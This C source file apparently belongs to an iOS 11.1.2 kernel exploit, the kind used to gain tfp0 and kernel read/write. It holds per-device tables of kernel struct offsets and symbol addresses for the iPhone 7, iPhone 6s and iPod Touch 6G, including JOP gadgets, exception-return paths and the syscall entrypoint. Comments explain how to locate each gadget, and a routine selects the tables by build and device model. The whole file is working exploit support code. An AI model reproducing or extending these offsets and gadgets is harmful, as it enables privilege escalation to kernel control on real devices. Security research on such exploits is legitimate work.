#include <stdio.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>

#include "symbols.h"
#include "kmem.h"
#include "kutils.h"

// the offsets are unlikely to change between similar models and builds, but the symbol addresses will
// the offsets are required to get the kernel r/w but the symbols aren't

int* offsets = NULL;


/* iOS 11.1.2 */
int kstruct_offsets_15B202[] = {
  0xb,   // KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE,
  0x10,  // KSTRUCT_OFFSET_TASK_REF_COUNT,
  0x14,  // KSTRUCT_OFFSET_TASK_ACTIVE,
  0x20,  // KSTRUCT_OFFSET_TASK_VM_MAP,
  0x28,  // KSTRUCT_OFFSET_TASK_NEXT,
  0x30,  // KSTRUCT_OFFSET_TASK_PREV,
  0x308, // KSTRUCT_OFFSET_TASK_ITK_SPACE
  0x368, // KSTRUCT_OFFSET_TASK_BSD_INFO,
  
  0x0,   // KSTRUCT_OFFSET_IPC_PORT_IO_BITS,
  0x4,   // KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES,
  0x40,  // KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE,
  0x50,  // KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT,
  0x60,  // KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER,
  0x68,  // KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT,
  0x90,  // KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT,
  0xa0,  // KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS,
  
  0x10,  // KSTRUCT_OFFSET_PROC_PID,
  
  0x20,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE
  
  0x180, // KSTRUCT_OFFSET_THREAD_BOUND_PROCESSOR
  0x188, // KSTRUCT_OFFSET_THREAD_LAST_PROCESSOR
  0x190, // KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR
  0x408, // KSTRUCT_OFFSET_THREAD_CONTEXT_DATA
  0x410, // KSTRUCT_OFFSET_THREAD_UPCB
  0x418, // KSTRUCT_OFFSET_THREAD_UNEON
  0x420, // KSTRUCT_OFFSET_THREAD_KSTACKPTR
  
  0x54,  // KSTRUCT_OFFSET_PROCESSOR_CPU_ID
  
  0x28,  // KSTRUCT_OFFSET_CPU_DATA_EXCEPSTACKPTR
  0X78,  // KSTRUCT_OFFSET_CPU_DATA_CPU_PROCESSOR
};

int koffset(enum kstruct_offset offset) {
  if (offsets == NULL) {
    printf("need to call symbols_init() prior to querying offsets\n");
    return 0;
  }
  return offsets[offset];
}

// this is the base of the kernel, not the kernelcache
uint64_t kernel_base = 0;
uint64_t* symbols = NULL;
uint64_t kaslr_slide = 0;

// ip7
uint64_t ksymbols_iphone_7_15B202[] = {
  0xfffffff0074d74cc, // KSYMBOL_OSARRAY_GET_META_CLASS,
  0xfffffff007566454, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
  0xfffffff007567bfc, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
  0xfffffff0073eb130, // KSYMBOL_CSBLOB_GET_CD_HASH
  0xfffffff007101248, // KSYMBOL_KALLOC_EXTERNAL
  0xfffffff007101278, // KSYMBOL_KFREE
  0xfffffff0074d74d4, // KYSMBOL_RET
  0xfffffff0074f11cc, // KSYMBOL_OSSERIALIZER_SERIALIZE,
  0xfffffff00758c618, // KSYMBOL_KPRINTF
  0xfffffff0074fc164, // KSYMBOL_UUID_COPY
  0xfffffff0075b2000, // KSYMBOL_CPU_DATA_ENTRIES
  0xfffffff0070cc1d4, // KSYMBOL_VALID_LINK_REGISTER
  0xfffffff0070cc1ac, // KSYMBOL_X21_JOP_GADGET
  0xfffffff0070cc474, // KSYMBOL_EXCEPTION_RETURN
  0xfffffff0070cc42c, // KSYMBOL_THREAD_EXCEPTION_RETURN
  0xfffffff0071e1998, // KSYMBOL_SET_MDSCR_EL1_GADGET
  0xfffffff007439b20, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // this is actually 1 instruction in to the entrypoint
  0xfffffff0071de074, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP
  0xfffffff0071dea24, // KSYMBOL_SLEH_SYNC_EPILOG
};

uint64_t ksymbols_ipod_touch_6g_15b202[] = {
  0xFFFFFFF0074A4A4C, // KSYMBOL_OSARRAY_GET_META_CLASS,
  0xFFFFFFF007533CF8, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
  0xFFFFFFF0075354A0, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
  0xFFFFFFF0073B71E4, // KSYMBOL_CSBLOB_GET_CD_HASH
  0xFFFFFFF0070C8710, // KSYMBOL_KALLOC_EXTERNAL
  0xFFFFFFF0070C8740, // KSYMBOL_KFREE
  0xFFFFFFF0070C873C, // KYSMBOL_RET
  0xFFFFFFF0074BE978, // KSYMBOL_OSSERIALIZER_SERIALIZE,
  0xFFFFFFF007559FD0, // KSYMBOL_KPRINTF
  0xFFFFFFF0074C9910, // KSYMBOL_UUID_COPY
  0xFFFFFFF00757E000, // KSYMBOL_CPU_DATA_ENTRIES         // 0x6000 in to the data segment
  0xFFFFFFF00709818C, // KSYMBOL_VALID_LINK_REGISTER      // look for reference to  FAR_EL1 (Fault Address Register (EL1))
  0xFFFFFFF007098164, // KSYMBOL_X21_JOP_GADGET           // look for references to FPCR (Floating-point Control Register)
  0xFFFFFFF007098434, // KSYMBOL_EXCEPTION_RETURN         // look for references to Set PSTATE.DAIF [--IF]
  0xFFFFFFF0070983E4, // KSYMBOL_THREAD_EXCEPTION_RETURN  // a bit before exception_return
  0xFFFFFFF0071AD144, // KSYMBOL_SET_MDSCR_EL1_GADGET     // look for references to MDSCR_EL1
  0xFFFFFFF0074062F4, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // look for references to enosys to find the syscall table (this is actually 1 instruction in to the entrypoint)
  0xFFFFFFF0071A90C0, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP  // look for xrefs to "ESR (0x%x) for instruction trapped" and find switch case 49
  0xFFFFFFF0071A9ABC, // KSYMBOL_SLEH_SYNC_EPILOG         // look for xrefs to "Unsupported Class %u event code."
};

uint64_t ksymbols_iphone_6s_15b202[] = {
  0xFFFFFFF00748D548, // KSYMBOL_OSARRAY_GET_META_CLASS,
  0xFFFFFFF00751C4D0, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
  0xFFFFFFF00751DC78, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
  0xFFFFFFF0073A1054, // KSYMBOL_CSBLOB_GET_CD_HASH
  0xFFFFFFF0070B8088, // KSYMBOL_KALLOC_EXTERNAL
  0xFFFFFFF0070B80B8, // KSYMBOL_KFREE
  0xFFFFFFF0070B80B4, // KYSMBOL_RET
  0xFFFFFFF0074A7248, // KSYMBOL_OSSERIALIZER_SERIALIZE,
  0xFFFFFFF0075426C4, // KSYMBOL_KPRINTF
  0xFFFFFFF0074B21E0, // KSYMBOL_UUID_COPY
  0xFFFFFFF007566000, // KSYMBOL_CPU_DATA_ENTRIES         // 0x6000 in to the data segment
  0xFFFFFFF00708818C, // KSYMBOL_VALID_LINK_REGISTER      // look for reference to  FAR_EL1 (Fault Address Register (EL1))
  0xFFFFFFF007088164, // KSYMBOL_X21_JOP_GADGET           // look for references to FPCR (Floating-point Control Register)
  0xFFFFFFF007088434, // KSYMBOL_EXCEPTION_RETURN         // look for references to Set PSTATE.DAIF [--IF]
  0xFFFFFFF0070883E4, // KSYMBOL_THREAD_EXCEPTION_RETURN  // a bit before exception_return
  0xFFFFFFF007197AB0, // KSYMBOL_SET_MDSCR_EL1_GADGET     // look for references to MDSCR_EL1
  0xFFFFFFF0073EFB44, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // look for references to enosys to find the syscall table (this is actually 1 instruction in to the entrypoint)
  0xFFFFFFF0071941D8, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP  // look for xrefs to "ESR (0x%x) for instruction trapped" and find switch case 49
  0xFFFFFFF007194BBC, // KSYMBOL_SLEH_SYNC_EPILOG         // look for xrefs to "Unsupported Class %u event code."
};

uint64_t ksym(enum ksymbol sym) {
  if (kernel_base == 0) {
    if (!have_kmem_read()) {
      printf("attempted to use symbols prior to gaining kernel read\n");
      return 0;
    }
    kernel_base = find_kernel_base();
    kaslr_slide = find_kernel_base() - 0xFFFFFFF007004000;
  }
  //return symbols[sym] + kernel_base;
  return symbols[sym] + kaslr_slide;
}

int have_syms = 0;
int probably_have_correct_symbols() {
  return have_syms;
}

void offsets_init() {
  size_t size = 32;
  char build_id[size];
  memset(build_id, 0, size);
  int err = sysctlbyname("kern.osversion", build_id, &size, NULL, 0);
  if (err == -1) {
    printf("failed to detect version (sysctlbyname failed\n");
    return;
  }
  printf("build_id: %s\n", build_id);
  
  struct utsname u = {0};
  uname(&u);
  
  printf("sysname: %s\n", u.sysname);
  printf("nodename: %s\n", u.nodename);
  printf("release: %s\n", u.release);
  printf("version: %s\n", u.version);
  printf("machine: %s\n", u.machine);
  
  // set the offsets
  
  if (strcmp(build_id, "15B202") == 0) {
    offsets = kstruct_offsets_15B202;
  } else {
    offsets = kstruct_offsets_15B202;
    printf("unknown kernel build. If this is iOS 11 it might still be able to get tfp0, trying anyway\n");
    have_syms = 0;
    return;
  }
  
  // set the symbols
  
  if (strstr(u.machine, "iPod7,1")) {
    printf("this is iPod Touch 6G, should work!\n");
    symbols = ksymbols_ipod_touch_6g_15b202;
    have_syms = 1;
  } else if (strstr(u.machine, "iPhone9,3")) {
    printf("this is iPhone 7, should work!\n");
    symbols = ksymbols_iphone_7_15B202;
    have_syms = 1;
  } else if (strstr(u.machine, "iPhone8,1")) {
    printf("this is iPhone 6s, should work!\n");
    symbols = ksymbols_iphone_6s_15b202;
    have_syms = 1;
  } else {
    printf("no symbols for this device yet\n");
    printf("tfp0 should still work, but the kernel debugger PoC won't\n");
    symbols = NULL;
    have_syms = 0;
  }
}


